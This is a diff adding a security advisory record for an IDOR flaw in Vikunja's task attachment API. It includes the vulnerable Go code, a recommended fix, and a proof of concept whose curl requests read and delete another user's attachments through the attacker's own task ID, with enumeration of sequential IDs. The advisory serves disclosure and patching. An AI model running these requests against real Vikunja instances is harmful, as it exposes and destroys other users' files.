@@ -1,0 +1,55 @@
+{
+  "id": "GHSA-jfmm-mjcp-8wq2",
+  "modified": "2026-03-26T21:11:07.858657Z",
+  "published": "2026-03-25T21:17:42Z",
+  "aliases": [
+    "CVE-2026-33678",
+    "GO-2026-4853"
+  ],
+  "summary": "Vikjuna: IDOR in Task Attachment ReadOne Allows Cross-Project File Access and Deletion",
+  "details": "## Summary\n\n`TaskAttachment.ReadOne()` queries attachments by ID only (`WHERE id = ?`), ignoring the task ID from the URL path. The permission check in `CanRead()` validates access to the task specified in the URL, but `ReadOne()` loads a different attachment that may belong to a task in another project. This allows any authenticated user to download or delete any attachment in the system by providing their own accessible task ID with a target attachment ID. Attachment IDs are sequential integers, making enumeration trivial.\n\n## Details\n\nThe vulnerability is in `pkg/models/task_attachment.go` in the `ReadOne` method:\n\n```go\n// pkg/models/task_attachment.go:110-120\nfunc (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {\n\texists, err := s.Where(\"id = ?\", ta.ID).Get(ta)  // Only checks attachment ID, ignores TaskID\n\tif err != nil {\n\t\treturn\n\t}\n\tif !exists {\n\t\treturn ErrTaskAttachmentDoesNotExist{\n\t\t\tTaskID:       ta.TaskID,\n\t\t\tAttachmentID: ta.ID,\n\t\t}\n\t}\n\t// ...\n}\n```\n\nThe permission check in `pkg/models/task_attachment_permissions.go` validates access to the URL task, not the attachment's actual task:\n\n```go\n// pkg/models/task_attachment_permissions.go:25-28\nfunc (ta *TaskAttachment) CanRead(s *xorm.Session, a web.Auth) (bool, int, error) {\n\tt := \u0026Task{ID: ta.TaskID}  // ta.TaskID is from URL param :task\n\treturn t.CanRead(s, a)\n}\n```\n\nThe `TaskAttachment` struct binds URL parameters via struct tags (`param:\"task\"` and `param:\"attachment\"`):\n```go\n// pkg/models/task_attachment.go:41-42\nID     int64 `xorm:\"bigint autoincr not null unique pk\" json:\"id\" param:\"attachment\"`\nTaskID int64 `xorm:\"bigint not null\" json:\"task_id\" param:\"task\"`\n```\n\n**Attack flow for read (GET):**\nThe custom handler at `pkg/routes/api/v1/task_attachment.go:156` calls `CanRead` (checks URL task) then `ReadOne` (loads attachment by ID only).\n\n**Attack flow for delete (DELETE):**\nThe generic CRUD handler calls `CanDelete` (checks write on URL task) then `Delete` which calls `ReadOne` (loads any attachment by ID), then deletes it.\n\nThis is the same vulnerability pattern that was already fixed for task comments, where `getTaskCommentSimple` was patched to add `AND task_id = ?` validation:\n\n```go\n// pkg/models/task_comments.go:196-205 (the fix)\nfunc getTaskCommentSimple(s *xorm.Session, tc *TaskComment) error {\n\tquery := s.Where(\"id = ?\", tc.ID).NoAutoCondition()\n\tif tc.TaskID != 0 {\n\t\tquery = query.And(\"task_id = ?\", tc.TaskID)\n\t}\n\t// ...\n}\n```\n\n## PoC\n\n**Prerequisites:** Two users (attacker and victim). Victim has a project with a task that has a file attachment. Attacker has read access to any task (e.g., their own project).\n\n**Step 1:** Attacker creates their own project and task.\n\n```bash\n# Attacker creates a project\ncurl -s -X PUT 'http://localhost:3456/api/v1/projects' \\\n  -H 'Authorization: Bearer \u003cattacker_token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"title\":\"attacker project\"}' | jq '.id'\n# Returns: 10\n\n# Attacker creates a task in their project\ncurl -s -X PUT 'http://localhost:3456/api/v1/projects/10/tasks' \\\n  -H 'Authorization: Bearer \u003cattacker_token\u003e' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"title\":\"attacker task\"}' | jq '.id'\n# Returns: 50\n```\n\n**Step 2:** Victim uploads a confidential attachment to their task (in a different project the attacker has no access to).\n\n```bash\ncurl -s -X PUT 'http://localhost:3456/api/v1/tasks/1/attachments' \\\n  -H 'Authorization: Bearer \u003cvictim_token\u003e' \\\n  -F 'files=@secret-document.pdf'\n# Returns attachment with id: 5\n```\n\n**Step 3:** Attacker downloads the victim's attachment by referencing their own task ID but the victim's attachment ID.\n\n```bash\n# Attacker accesses victim's attachment (id=5) via their own task (id=50)\ncurl -s -X GET 'http://localhost:3456/api/v1/tasks/50/attachments/5' \\\n  -H 'Authorization: Bearer \u003cattacker_token\u003e' \\\n  -o stolen-file.pdf\n# Returns: victim's secret-document.pdf\n```\n\n**Step 4:** Attacker can also delete the victim's attachment.\n\n```bash\ncurl -s -X DELETE 'http://localhost:3456/api/v1/tasks/50/attachments/5' \\\n  -H 'Authorization: Bearer \u003cattacker_token\u003e'\n# Returns: 200 OK — victim's attachment is deleted\n```\n\nSince attachment IDs are sequential autoincrement integers, the attacker can enumerate all attachments in the system (1, 2, 3, ...).\n\n## Impact\n\n- **Confidentiality:** Any authenticated user can download any file attachment in the entire system, regardless of project permissions. This includes confidential documents, images, and any files uploaded as task attachments.\n- **Integrity:** Any authenticated user with write access to any task can delete any attachment in the system, causing data loss for other users.\n- **Enumeration:** Sequential integer IDs make it trivial to iterate through all attachments without any prior knowledge of target attachment IDs.\n- **Scope:** Affects all Vikunja instances with task attachments enabled (the default).\n\n## Recommended Fix\n\nAdd `task_id` validation to `ReadOne`, mirroring the fix already applied to task comments:\n\n```go\n// pkg/models/task_attachment.go\nfunc (ta *TaskAttachment) ReadOne(s *xorm.Session, _ web.Auth) (err error) {\n\tquery := s.Where(\"id = ?\", ta.ID)\n\tif ta.TaskID != 0 {\n\t\tquery = query.And(\"task_id = ?\", ta.TaskID)\n\t}\n\texists, err := query.Get(ta)\n\tif err != nil {\n\t\treturn\n\t}\n\tif !exists {\n\t\treturn ErrTaskAttachmentDoesNotExist{\n\t\t\tTaskID:       ta.TaskID,\n\t\t\tAttachmentID: ta.ID,\n\t\t}\n\t}\n\n\t// ... rest unchanged\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.2.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-jfmm-mjcp-8wq2/GHSA-jfmm-mjcp-8wq2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-jfmm-mjcp-8wq2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33678"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://vikunja.io/changelog/vikunja-v2.2.2-was-released"
+    }
+  ]
+}
